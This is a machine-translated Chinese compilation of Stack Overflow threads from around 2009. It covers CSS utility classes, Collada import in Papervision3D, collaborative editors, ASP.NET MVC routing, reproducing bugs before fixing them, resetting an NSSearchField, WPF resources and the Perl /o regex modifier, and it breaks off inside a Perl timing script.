> 时间：2009-02-15T03:56:24.160

让我给你一个来自最近考虑使用 CSS 类作为“标记”的非常新手的 Web 开发人员的答案。请不要将此作为确定的答案，因为我可能完全错了，但请从另一个角度看待它。

我也打算使用一些标记类。我创建了一个名为 .center 的文件，以将 DIV 标签中的元素居中。但是，我对我看 CSS 完全错误的想法感到震惊。我推断 CSS 应该定义元素的显示方式，而无需更改 HTML 页面。通过使用标记类，例如 .center，如果我希望 DIV 标记在下个月右对齐，我将不得不同时更改 CSS 和 HTML。因此，我创建了一个 .latestHeader 类（DIV 用于保存“最新信息”，例如新闻项目），并在该类中将文本设置为居中对齐。现在，当我想更改文本的对齐方式时，我只需更改该 DIV 的 CSS，而不必触及 HTML。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T04:04:05.593

关于您关于 CSS 框架的问题...

就我个人而言，我一直发现[W3C](http://www.w3.org/Style/CSS/)对任何 CSS 问题都有最复杂但也最准确的答案。

经过多年的编程和使用 CSS/HTML/PHP，我同意上述评论。

使用沿 '.center' 或 '.righths' 的线条定义要居中或右对齐的标记是没有害处的，但请记住，如果您想更改整个平板text 你的工作将会增加，因为你必须同时编辑 CSS 和 HTML。

为整个部分定义格式很可能会更合乎逻辑，因为如果你想在几个月后更改部分，你只需要编辑一个 CSS 声明的格式，而不是编辑每篇文章。

然而，CSS 被设计为最终的样式语言，它可以允许管理员使网站看起来完全符合他们的要求。请记住，尽管过多的 CSS 会增加服务器的负载，会增加您的客户看到您的页面之前的时间，并且符合“**网页设计的风水**”，但过多的样式可能会过火。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T04:37:13.093

你真的应该根据需要增加这个列表，而不是一刀切地征求通用类的列表——你最终只会变得臃肿。如果您想避免重新发明轮子，请查看一些 CSS 框架（[蓝图](http://www.blueprintcss.org/)或[960](http://960.gs/)）。在某些方面，像 .center { text-align:center } 这样的通用类确实具有一定程度的冗余，但通常需要它们。例如，以下模式太常见但应该避免：

```
element.onclick(function(e){ this.style.backgroundColor = 'yellow' } 
```

这很糟糕，因为你真的应该使用：

```
element.onclick(function(e){ this.className = 'highlight' } 
```

后者允许您仅通过触摸 CSS 文件来修改样式。但是，如果 CSS 类名只有一个样式元素，那么您可能应该避免使用它，因为拥有它没有任何意义（在您的示例中为 .hidden）并直接调用它：

```
element.onclick(function(e){ this.display = 'hidden} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-18T18:33:17.670

我经常发现自己在我的所有样式表中都保留了两个类：“center”（它只是简单地应用`text-align: center;`，以及一个浮动清除类）`clear:both;`。

我考虑过为我所有的样式添加一个“重置”语句，但还没有需要它。重置语句将类似于以下内容：

```
*
{
  margin: 0;
  padding: 0;
} 
```

我经常重复使用它们以将它们包含在几乎所有内容中。它们足够小，所以我觉得它们根本不会膨胀代码。

# flash - 在 Papervision 3d 中导入 Collada 文件

> ID：550227
> 
> 赞同：1
> 
> 时间：2009-02-15T03:02:36.317
> 
> 标签：flash, actionscript, papervision3d, collada, 3dsmax

我在 Papervision3d 中导入 Collada 文件时遇到问题。我做了详尽的谷歌搜索无济于事。所有示例和教程都以错误结尾，无论是“找不到材料”错误还是根本不显示文件。我尝试了许多不同类型的 Collada 文件，包括来自他们的测试库的许多 Collada 自己的文件。基本上，我只想知道一种使用 Papervision 3d 2.0 (Great White) 将 Collada 文件加载到闪存中的更新方法。

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-06T19:42:00.537

如果您使用的是 3dsMax，则需要获取一个插件来导出 collada 文件。默认导出无法正常工作。如果您使用的是 3dsMax 2009，则需要一个特殊版本的插件。

我相信就是这样： [http ://www.flashbookmarks.com/pv3dchat/ColladaMax2009.zip](http://www.flashbookmarks.com/pv3dchat/ColladaMax2009.zip)

一旦您知道您的 dae 文件是正确的，您将需要使用您的 3D 文件将使用的每种材料构建一个 MaterialsList 对象。这有点工作，但在你完成之后，一切都会好起来的。确保 MateriasList 中材料的名称与 3d 程序中的相同。它们将按其名称映射到 3d 对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-07-12T12:41:41.590

```
cow = new Collada("http://papervision2.com/wp-content/downloads/dae/cow.dae");
scene.addChild(cow); 
```

您可以使用本地模型。只是不要忘记创建一个相机并将其指向您的模型。也不要忘记“addChild”。+ 尝试使用模型 Scale，它可能太大而无法适应屏幕。

# ajax - 我正在寻找支持协作的基于 Web 的文本编辑器

> ID：550228
> 
> 赞同：3
> 
> 时间：2009-02-15T03:06:12.017
> 
> 标签：ajax, text-editor, collaboration

我正在寻找一个支持与 2 人或更多人协作的基于 Web 的文本编辑器。

我希望与远方的其他几个人一起开展一个相当“小”的项目，并且真的希望我们能够同时处理同一个文件并“实时”看到彼此所做的更改.

建立在其上的语言不是什么大问题，希望有语法突出显示，但并不是真正需要的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T03:19:50.503

[EtherPad](http://etherpad.com)是实时协作编辑的理想选择，如果您对纯文本没问题的话，它比[谷歌文档](http://docs.google.com)要好得多。

在这里试试： http: [//etherpad.org/](http://etherpad.org/)

我刚刚尝试了[CollabEdit](http://collabedit.com)进行比较，它似乎真的无法处理两个人同时打字。

另请参阅以下类似问题：

*   [您如何与其他编码人员实时协作？](https://stackoverflow.com/questions/510163/how-do-you-collaborate)
*   [https://stackoverflow.com/questions/148538/what-is-a-great-tool-for-remote-pair](https://stackoverflow.com/questions/148538/what-is-a-great-tool-for-remote-pair)
*   [Tomorrow's Wiki 应该包含哪些功能？](https://stackoverflow.com/questions/457211/what-features-should-tomorrows-wiki)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T03:09:42.790

试用来自 Mozilla 的新[Bespin ！](http://bespin.mozilla.com)它应该内置协作工具，尽管我不确定是否所有功能都可用。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-02-15T03:10:33.957

[谷歌文档](http://docs.google.com)将是一个节省的赌注。它允许同时编辑。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-02-15T03:33:36.820

[合作编辑](http://www.collabedit.com/)

我在另一个问题中看到了这个链接，它似乎 100% 符合要求，基于网络和语法突出显示。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T03:10:29.683

您看过[Google Apps](http://www.google.com/apps/intl/en/business/index.html)吗？我和另外两个人正在使用电子表格来规划一个项目。您可以看到其他人在他们的游标周围移动并输入文本。非常非常酷。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-15T13:42:51.820

看看 [DocSynch](http://docsynch.sourceforge.net/)

我看到了 Eclipse 插件的演示，我不记得它的名字......也许[这个](http://wiki.eclipse.org/index.php/RT_Shared_Editing)

此[wiki 页面](http://en.wikipedia.org/wiki/Collaborative_real-time_editor)也有一个协作编辑器列表。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-15T04:16:19.243

我听说 Mozilla 的新“云”文本编辑器[Bespin](https://bespin.mozilla.com/)看起来很有趣。

# asp.net-mvc - 寻找用于路由信息的示例 global.asax.cs 文件

> ID：550229
> 
> 赞同：2
> 
> 时间：2009-02-15T03:08:22.823
> 
> 标签：asp.net-mvc, routing, global-asax

无论您读到什么有关[ASP.NET 路由](http://stephenwalther.com/blog/archive/2009/02/06/chapter-2-understanding-routing.aspx "此链接将在图书出版后失效")或 REST 的信息，我认为了解更多关于它们的最佳方法是阅读其他人的路由文件。在与[Jeff](http://codinghorror.com)[的视频中，如果您将视频暂停在正确的位置，](http://haacked.com/archive/2008/09/15/stackoverflow-at-pdc.aspx)您可以瞥见stackoverflow 路由文件。实际上，仅看它的组织方式，我就学到了很多东西。

为此 - 是否有人想从 global.asax.cs 发布他们的路由数据（全部或部分）以供其他人学习？我会在它更有条理的时候发布我的——现在有点乱。

提示：并不是说您应该有任何安全漏洞 - 但您可能想在发布文件之前检查文件中是否没有任何“秘密”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-02T21:44:40.777

很惊讶地看到[NerdDinner](http://www.codeplex.com/nerddinner)路由文件只有一个自定义路由。证明如果您遵循约定，您可以“开箱即用”使用路由处理程序。

```
namespace NerdDinner {

    public class MvcApplication : System.Web.HttpApplication {

        public void RegisterRoutes(RouteCollection routes) {

            routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

            routes.MapRoute(
                "UpcomingDinners", 
                "Dinners/Page/{page}", 
                new { controller = "Dinners", action = "Index" }
            );

            routes.MapRoute(
                "Default",                                              // Route name
                "{controller}/{action}/{id}",                           // URL with parameters
                new { controller = "Home", action = "Index", id = "" }  // Parameter defaults
            );
        }

        void Application_Start() {
            RegisterRoutes(RouteTable.Routes);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T16:27:14.700

这是一个实时应用程序的示例。

[http://www.codeplex.com/Kigg/SourceControl/changeset/view/18277#347257](http://www.codeplex.com/Kigg/SourceControl/changeset/view/18277#347257)

应用程序托管在 www.dotnetshoutout.com

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-24T15:21:23.410

[在此处](http://www.tampadev.org/News/Details/ASPNETMVCSampleApplicationsOpenSourceExamplesTutorials)查看mvc 示例应用程序。

# testing - 我们是否应该总是重现错误以验证修复？

> ID：550242
> 
> 赞同：22
> 
> 时间：2009-02-15T03:18:16.997
> 
> 标签：testing, qa

有时我们会遇到生产中的错误，可以通过例如更改配置、禁用某些逻辑等来修复这些错误。

我和我的经理争论说我们应该在本地重现错误以确保修复工作，更重要的是，开发人员和 QA 可以将这些情况的检查作为常规发布的一部分。

我的经理认为这是浪费时间，因为该解决方案有效，因此无需在本地复制。

那么：我们是否应该尝试在本地重现以验证修复？如果您同意我的观点，关于如何将这一点推销给我的经理的任何指示？

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2009-02-15T03:43:33.037

如果您还没有重现该错误，那么您的“修复”只不过是猜测而已。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2009-02-15T03:27:13.777

在我的头顶上：

*   您可能会无意中通过修复引入新错误
*   您不能 100% 确定该修复程序在没有测试的情况下确实修复了错误（可能在最简单的情况下除外）

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2009-02-15T03:25:21.160

如果在经济上可行（例如，不要为了重现环境而将某些用户的整个硬盘驱动器复制到您的本地计算机），我非常相信重现错误。

错误的不幸本质是通常只有一种方法可以修复错误，但有很多方法可以掩盖它，而且许多修复实际上是掩盖而不是修复。您可能永远找不到根本原因，因此该错误会再次出现，或者稍后会出现另一个看似不同的错误。

如果您能找到发生这种情况的示例（例如，来自同一根本原因的两个不相关的错误），您可能能够赢得您的老板的支持。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2009-02-15T04:20:05.867

该错误的性质也存在疑问：

1.  能否通过单元测试快速重现缺陷？如果是这样，从事修复工作的开发人员应该编写所述单元测试，将其集成到更完整的回归套件中。这确保了未来的工作不会重新引入该缺陷。

2.  能否以编程方式重现缺陷（例如，使用 Perl 或 Python 脚本）？如果是这样，QA 团队可能应该有一个涵盖它的自动化测试用例，并且可以快速用于验证。

3.  可以通过一组分步说明重现缺陷吗？如果是这样，QA 团队（或最初标记错误的人）应该提供绝对最少的重现步骤。

这三个原则极大地有助于推动我的测试团队的 QA 流程。

重现缺陷通常符合开发人员的最大利益。如果这是不可能的（例如硬件资源稀缺），那么直接与 QA（或最初标记该错误的人）合作将是下一个最佳选择。尽管有些缺陷很明显（例如菜单选项中的拼写错误），但其他缺陷可能会产生更大的后果，这可能会被知道应用程序底层状态的开发人员发现。

让开发人员重现缺陷以确认它们确实是缺陷也很有帮助。测试人员虽然不可或缺（作为软件测试人员；）），但通常缺乏对应用程序代码的深入了解，并且可能对为什么行为不符合他们的期望（或规范）没有深入的了解。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-02-15T05:24:28.817

您不应该在本地复制它的唯一情况是不可行的情况。也许它需要*大量*数据、专有数据、硬件，或者它可能需要比您拥有的更复杂的设置。

我不得不这样做几次，因为我们无法在内部复制设置。（一些开发工作甚至已经在客户的系统上完成。）客户从一开始就知道他们超出了我们可以重现的范围，并且由此引发的错误将是一个痛苦的处理。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2009-02-15T03:29:20.637

测试驱动开发背后的基本原则是你有一个展示一些特性的测试。

在这种情况下，您将创建一个演示该错误的测试。测试失败。

你修复错误。测试通过。和所有其他测试一样。您*实际上*已经修复了该错误而没有产生其他问题。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2009-02-15T06:11:39.530

这个问题有很多很好的答案，但大多数都没有直接谈论经济情况，这可能是影响你经理的主要因素。

如果你不复制，那么你

*   现在节省时间/精力，但是
*   招致风险

在降低风险的努力之间权衡取舍很大程度上取决于具体情况——你正在生产什么样的软件，有多少客户，生产中的“坏”错误有多少（例如，销售网站是否出现故障，你会失败）每天一百万美元，或者网络论坛是否关闭，人们必须等到明天才能在线聊天），你有多少测试自动化（影响重现/回归错误的努力），......

许多（大多数？）经理都规避风险，因此在说服方面，请尝试说明各种风险（回归其他功能，部署实际上无法修复它的修复程序（并且在客户看来很愚蠢），... ) 以及估计您为减轻该风险所需付出的努力（复制成本和对修复有信心）。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2009-02-15T03:28:44.070

[**测试自动化**](http://en.wikipedia.org/wiki/Test_automation)使您的所有测试都可以在任何时候重新播放，几乎不需要额外的努力。[**单元测试**](http://en.wikipedia.org/wiki/Unit_test)是一种非常常见的测试自动化，它涉及测试每个单独的最小部分。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2009-02-15T19:26:34.177

你很急吗？如果是这样，那么重现错误！这会产生一种有条不紊的心态，您需要防止进一步的问题。你怎么可能发现旧的错误被重新引入？重现错误会引起其他人的注意：

**好经理**：“你在做什么？”

**优秀的开发人员**：“我们又遇到了那个错误。我正在重建测试环境，以便我们可以重放它。”

**好经理**：“WTF？我以为戴夫说他修复了那个？嘿戴夫，你没有修复那个错误吗？为什么我们又在这个问题上浪费时间？

相对：

**混蛋经理**：“你在做什么？”

**优秀的开发人员**：“我们又遇到了那个错误。我正在重建测试环境，以便我们可以重放它。”

**混蛋经理**：“不——我们没有时间。把它修好然后回滚。你有没有回复关于会议的电子邮件？我得走了——我得和史蒂夫一起 10 天。好。啊，把它回滚，然后发送那封电子邮件。”

作为导演，我告诉我所有的团队“今天花点时间”把事情做好，这样我们就不会半夜起床了。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2009-02-15T04:55:37.607

不久前我读[了一本关于调试的好书，](https://rads.stackoverflow.com/amzn/click/com/0814474578)它不仅建议重现错误，而且在修复它之后：

*   取消修复并查看错误是否再次出现
*   放回修复程序并查看错误是否再次修复

原因是你可能会为了修复一个错误而费尽心思，这将帮助你*知道*你已经修复了它。如果您不*知道*已修复它，它可能仍然会损坏。

（前几天我遇到了这样一个案例，其中一行似乎没有关系的代码导致我们的网站运行异常：当我取出这行代码时，网站可以正常工作，但是当我把它放入, 该站点还可以。但事实证明这只是巧合；无论我做什么，该站点每隔一段时间就会出错，因为它巧妙地让我登录和退出。您必须知道您的修复是真实的使固定。）

**编辑：** 我在一个老板对声称已修复但没有修复的错误非常暴躁的地方工作。发生这种情况是因为即使我（或其他开发人员）能够重现该错误，但我并没有以与测试人员生成它的方式完全相同的方式重现它。您不仅应该重现该错误，而且**您应该确保您重现该错误的方式与测试人员完全相同**。

（但如果您想先自己尝试，请继续；也许您会发现另一个错误！之后，让测试人员在您开始处理错误之前演示他/她的再现。）

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2009-02-15T06:03:30.577

您必须始终**尝试**。您需要确定它是错误、错误还是缺陷。您如何在不了解问题的情况下解决或缓解问题？

记录或测试套件将如何解决？状态是否合适
——“已修复”、“开放”、“无法复制”、“不会修复”、“功能”？

如果你不能重现它，仍然必须做出决定，让它飘入 /dev/null 就是要求它回来咬你。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2009-02-15T03:26:32.390

必须在本地重现错误的最重要原因是确保在修复它时没有搞砸其他任何东西。如果修复只是一个配置或任何不需要重新编译的东西，那么这个参数就没有那么强大了，因为任何已经编译的东西都应该已经过测试。

如果你的经理没有明白这一点，那么除了向他展示修复错误实际上搞砸了某些事情的真实案例之外，你无能为力说服他，这会导致比在本地重现错误所花费的更多延迟.

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2009-02-15T03:32:52.080

我认为这个问题的答案取决于你如何测试你的错误。

*   您是否使用自动化测试工具（如 xUnit 框架、Fit/Fitnesse 等）？
*   您使用自动构建过程吗？
*   这个自动化构建过程是否会调用测试并记录结果？

除非上述问题的答案是肯定的，否则合并检查以验证错误修复已经发生将是乏味和痛苦的。也很难说服经理花时间来合并这些检查，因为他们总是会说“好吧，我们没有足够的人力资源来做这件事”

如果您在自动化解决方案上投入了一些时间，那么将这些测试添加到构建过程中将是不费吹灰之力，因为解决任何错误的第一步应该是创建一个无论如何在本地重现问题的测试。

对于我的项目，我们使用 subversion 进行源代码控制，使用 Jira 进行活动管理，使用 Hudson 进行构建，使用 Fitnesse 和 MSTest 进行测试。所有这些都使用持续集成捆绑在一起。Fitnesse 进行验收测试，MSTest 进行单元测试，每次执行构建时它们都会自动运行，从而为我们提供构建“好”程度的量化指标。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2009-02-15T04:08:27.953

我发现不复制错误来修复它的想法很奇怪。

毕竟，在您重现问题之前，您无法确定问题是否存在。在那之前，它只是推测（即使消息灵通，它仍然是推测）。

现在，无论您是否进行单元测试，我认为与此讨论无关，因为可重复性只是您是否找到错误的问题？如果您正在测试错误的东西，进行一些不正确的假设，或者只是误解了（可能是模糊的）关于实际发生的错误报告，那么单元测试将无济于事。

这就是你重现问题的原因。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2009-02-15T04:02:43.833

虽然说单元测试是解决方案，如果使用它们听起来不错，您不必重现错误，但我认为它在现实世界中行不通。他们没有在现场复制错误的事实意味着复制可能不是微不足道的。这可能意味着来源很复杂。如果问题在单元测试中表现得微不足道，那么该单元测试将是错误的再现。如果他们没有复制它，他们可能无法为它编写一个简单的单元测试。

如果你没有重现这个错误，你就没有真正理解它。您可能在系统中发现**了一个**错误，但这并不能保证您已经找到了客户所看到的错误**。**

如果你不能重现这个错误，你就不能确定它是否真的被修复了。您可能只处理问题的症状，而不是核心问题。客户可能对同一个核心问题有不同的向量，他们的问题不会得到解决。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2009-02-15T04:09:24.970

是的，在可能/可行的情况下；见[回归测试](http://en.wikipedia.org/wiki/Regression_testing)

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2009-02-15T05:38:34.413

在大多数情况下，您无法知道您重现的错误与您的客户遇到的错误相同。因此，复制并不能保证问题真的得到解决。

例如，客户在我参与的项目中遇到了通信错误。我们搜索了代码以修复任何可能的错误。一个错误涉及 PIC 微处理器中的 ASIC 错误，芯片勘误表提供了我们实施的解决方法。然后我的一位同事采取了极端措施来重现该错误，以便他可以声称我们客户的问题可能已经修复。

不是。

最后，我们添加了很多防御性编码，客户再也没有遇到过这个问题。我们不确定究竟是哪个修复解决了这个问题，知道并重现我们的客户遇到的问题会很棒，但归根结底，这些都不重要。重要的是软件的工作原理。

因此，能够重现错误并深入了解导致问题的原因固然很棒，但重现错误并不能保证解决客户的问题，工作软件更重要。

听起来您的工作场所在“无复制”范围内太过分了，当一点额外的工作可以生产出更可靠的软件时，这是一种耻辱。在这篇文章中，我认为光谱的另一端也不是那么好，所以我会尝试推动介于两者之间的东西。

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2009-11-28T20:40:39.360

> 我与我的经理争论说我们应该在本地重现错误以确保修复工作，更重要的是，开发人员和 QA 可以将这些情况的检查作为常规发布的一部分。

我特别同意关于开发人员和 QA 的部分，包括检查。这是日本人所说的[Jidoka](http://en.wikipedia.org/wiki/Autonomation)的一部分（代表“人性化的自动化”）：

> [...] 自动化可防止生产有缺陷的产品，消除生产过剩，并将注意力集中在了解问题并确保其不再发生。这是一个应用以下四个原则的质量控制过程：
> 
> 1.  检测异常。
> 2.  停止。
> 3.  修复或纠正眼前的状况。
> 4.  调查根本原因并安装对策。

对策是防止再次发生。这就是您构建[防](http://en.wikipedia.org/wiki/Poka-yoke)错流程的方式（并且让缺陷发生的流程是有缺陷的流程）。好的管理者应该明白这一点。

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2013-05-06T07:32:28.953

## 如果您无法重现错误，则无法修复它们。

*   更改配置、禁用部分逻辑等在生产环境中是一种临时解决方案。

*   我们需要通过本地测试来确保产品可靠并满足客户要求，跨设备（移动设备、平板电脑等）和跨平台（Firefox、Chrome、Internet Explorer）测试在这里也起着重要作用。

*   检查问题是先在本地复制，以确保产品的质量，因为如果客户发现同样的问题，那就是问题:)

*   提供可靠、无错误的产品理解和重现问题是最重要的。

*   正如您所提到的，通过更改配置、禁用某些逻辑等，可以修复错误（即无法重现）。但是如果客户有相同的配置，而你暂时要更改，那这实际上是一个大问题，所以跨设备（手机、平板电脑等）和跨平台（Firefox、Chrome、Internet Explorer）测试非常重要的。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2009-02-15T19:13:48.577

试着让你的经理因为愚蠢而被解雇并得到他的工作，这可能是一个机会！

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2009-02-15T05:42:28.647

对于现场随机崩溃，有时您无法重现它们。我使用 Microsoft 的 Windows 错误报告服务收集的事后崩溃转储调试了罕见的竞争条件和“不可能的”崩溃。我认为微软大师 Raymond Chen 称之为“心理调试”。

如果您的公司向公众提供 Windows 软件（C++ 或 .NET），我强烈建议使用 Microsoft 的 Windows 错误报告 (WER) 服务。它是免费的，即使对于商业软件公司也是如此。它比编写自己的错误报告和故障转储收集服务更简单。WER 甚至会整理所有堆栈跟踪，以便您知道哪些崩溃是重复的，这在您不想调试数千个重复崩溃时很有帮助。:)

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2009-11-28T20:15:23.343

可能会重复已经写过的内容，但是是的！理由是：只发现一次错误。如果您可以编写一个复制错误的测试，您将不必再次手动测试它 - 您的自动化测试会找到它。
因此，您修复了该错误，并且您可以放心，您的软件将永远不会再遭受此错误的影响。这很好。这将节省您的时间。它会帮你省钱。

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2013-05-13T10:00:37.843

*   As the bug is already in production, it means that something might have missed during testing and that too by mistake.
*   After some time when the tester/QA finds the bug or if that bug is reported by customer then from developer's side some fixes have been made.
*   After fixing those bugs, locally they should be checked if they are reproducible or not based on test scenario and test coverage, so that they will not be there in the production again in future and customer will never face errors or issues.

# cocoa - 如何以编程方式重置可可 NSSearchField？

> ID：550246
> 
> 赞同：8
> 
> 时间：2009-02-15T03:22:27.003
> 
> 标签：cocoa

我有一个简单的可可用户界面，其中包含项目列表和搜索字段，分别使用 NSTableView 和 NSSearchField 实现。数据源和所有绑定都已设置好并且运行良好。我在列表中看到我的数据，我可以通过在搜索字段中输入字符串来搜索它。随着我输入更多文本，列表中的项目数越来越少，最终减少到我正在搜索的一项。

现在，如何清除搜索字段中的文本并强制列表恢复正常？我可以通过手动清除文本（使用键盘）来实现这一点，但是当我尝试以编程方式执行此操作时，列表中的隐藏项目不会回来。

我正在使用这个：

```
[searchField setStringValue:@""]; 
```

清除搜索字段中的文本，但不会重置列表。

有任何想法吗？有没有我在文档中找不到的简单 [searchField reset] 方法？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-15T04:57:38.507

> 我想到了。以下代码有效：
> 
> ```
> [searchField setStringValue:@""];
> [[[searchField cell] cancelButtonCell] performClick:self]; 
> ```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-02-15T03:40:11.127

我想到了。以下代码有效：

```
[searchField setStringValue:@""];
[[[searchField cell] cancelButtonCell] performClick:self]; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-15T12:18:04.143

`[[[searchField cell] cancelButtonCell] performClick:self];`可能有效，但似乎应该有一个“适当的”解决方案。您的表视图是否实际上绑定到了 searchField 的值，或者它是否绑定到了一些在您以编程方式将 searchField 的内容设置为空字符串时未更新的中间对象（但由于绑定的方式，当您键入时它会更新都设置在笔尖）？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-01-16T17:50:28.480

输入一些文本后按回车将调用 searchFieldDidStartSearching，然后是 searchFieldDidEndSearching 并清除 textField。

```
extension NSSearchField {
    func resetSearch() {
        if let searchFieldCell = self.cell as? NSSearchFieldCell {
            searchFieldCell.cancelButtonCell?.performClick(self)
        }
    }
} 
```

这是我的委托代码

```
extension ViewController : NSSearchFieldDelegate {

    func searchFieldDidEndSearching(_ sender: NSSearchField) {
        print("end \(sender.stringValue)")
    }

    func searchFieldDidStartSearching(_ sender: NSSearchField) {
        print("start \(sender.stringValue)")

        DispatchQueue.main.async {
            // calling resetSearch on main thread preserves focus ring
            sender.resetSearch()
       }
    }
} 
```

# wpf - 你如何排除一个对象来获取默认的资源字典？

> ID：550254
> 
> 赞同：3
> 
> 时间：2009-02-15T03:29:17.780
> 
> 标签：wpf, resources

我正在使用第 3 方资源字典，它与我需要使用的另一个用户控件冲突。如何从获取默认资源字典中排除此用户控件？

谢谢

戴夫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T17:58:27.663

不知道您是否可以明确排除它，但您可以创建自己的资源字典并在其中为您的控件创建样式。

使用键专门引用样式并将该键用于您的用户控件。应该覆盖默认资源字典。您可能必须将资源字典合并到[共享资源](http://blogs.msdn.com/wpfsdk/archive/2007/06/08/defining-and-using-shared-resources-in-a-custom-control-library.aspx)中。

# regex - Perl 正则表达式的 'o' 修饰符是否仍然提供任何好处？

> ID：550258
> 
> 赞同：41
> 
> 时间：2009-02-15T03:30:22.817
> 
> 标签：regex, perl

在 Perl 正则表达式的末尾包含 'o' 修饰符过去被认为是有益的。当前的[Perl 文档](http://perldoc.perl.org/)甚至似乎都没有列出它，当然也没有在[perlre 的修饰符部分](http://perldoc.perl.org/perlre.html#Modifiers)。

它现在有什么好处吗？

出于向后兼容性的原因，如果没有别的原因，它*仍然被接受。*

* * *

正如 JA Faucet 和 brian d foy 所指出的，如果您找到合适的位置（其中一个不是`perlre`文档），“o”修饰符仍然会记录在案。[perlop](http://perldoc.perl.org/perlop.html#Regexp-Quote-Like-Operators)页面中提到了它。它也可以在[perlreref](http://perldoc.perl.org/perlreref.html)页面中找到。

正如 Alan M 在接受的答案中所指出的，更好的现代技术通常是使用 qr// （引用的正则表达式）运算符。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2009-02-15T04:40:54.943

`/o`已弃用。确保正则表达式只编译一次的最简单方法是使用正则表达式对象，如下所示：

```
my $reg = qr/foo$bar/; 
```

的插值`$bar`是在变量`$reg`初始化时完成的，从那时起，缓存、编译的正则表达式将在封闭范围内使用。但有时您*希望*重新编译正则表达式，因为您希望它使用变量的新值。下面是 Friedl 在[The Book](https://rads.stackoverflow.com/amzn/click/com/0596528124)中使用的示例：

```
sub CheckLogfileForToday()
{
  my $today = (qw<Sun Mon Tue Wed Thu Fri Sat>)[(localtime)[6]];

  my $today_regex = qr/^$today:/i; # compiles once per function call

  while (<LOGFILE>) {
    if ($_ =~ $today_regex) {
      ...
    }
  }
} 
```

在函数范围内，$today_regex 的值保持不变。但是下次调用该函数时，正则表达式将使用新值重新编译`$today`。如果他刚刚使用：

```
if ($_ =~ m/^$today:/io) 
```

...正则表达式永远不会更新。因此，使用对象形式，您可以在不牺牲灵活性的情况下获得 /o 的效率。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2009-02-15T20:52:59.507

该`/o`修饰符位于[perlop](http://perldoc.perl.org/perlop.html)文档而不是[perlre](http://perldoc.perl.org/perlop.html)文档中，因为它是一个类似于引号的修饰符而不是正则表达式修饰符。这对我来说总是很奇怪，但事实就是如此。从 Perl 5.20 开始，它现在被列在[perlre](http://perldoc.perl.org/perlop.html)中，只是为了说明您可能不应该使用它。

在 Perl 5.6 之前，即使变量没有改变，Perl 也会重新编译正则表达式。你不再需要这样做了。`/o`尽管对变量进行了进一步更改，但您可以使用一次编译正则表达式，但正如其他答案所指出的那样，`qr//`这样做更好。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-09-23T09:27:10.487

在 Perl 5 版本 20.0 文档 [http://perldoc.perl.org/perlre.html](http://perldoc.perl.org/perlre.html) 它指出

```
Modifiers

Other Modifiers

…

o - pretend to optimize your code, but actually introduce bugs 
```

这可能是一种幽默的说法，它应该执行某种优化，但实现被破坏了。

因此，最好避免该选项。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-02-15T04:12:37.163

这是在正则表达式包含变量引用的情况下的优化。它表明正则表达式不会改变，即使它里面有一个变量。这允许进行原本不可能的优化。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-12-26T17:35:50.790

以下是调用匹配的不同方式的时间安排。

```
$ perl -v | grep version
This is perl 5, version 20, subversion 1 (v5.20.1) built for x86_64-linux-gnu-thread-multi

$ perl const-in-re-once.pl | sort
0.200   =~ CONST
0.200   =~ m/$VAR/o
0.204   =~ m/literal-wo-vars/
0.252   =~ m,@{[ CONST ]},o
0.260   =~ $VAR
0.276   =~ m/$VAR/
0.336   =~ m,@{[ CONST ]}, 
```

我的代码：

```
#! /usr/bin/env perl

use strict;
use warnings;

use Time::HiRes qw/ tv_interval clock_gettime gettimeofday /;
use BSD::Resource qw/ getrusage RUSAGE_SELF /;

use constant RE =>
    qr{
        https?://
        (?:[^.]+-d-[^.]+\.)?
        (?:(?: (?:dev-)? nind[^.]* | mr02 )\.)?
        (?:(?:pda|m)\.)?
        (?:(?:news|haber)\.)
        (?:.+\.)?
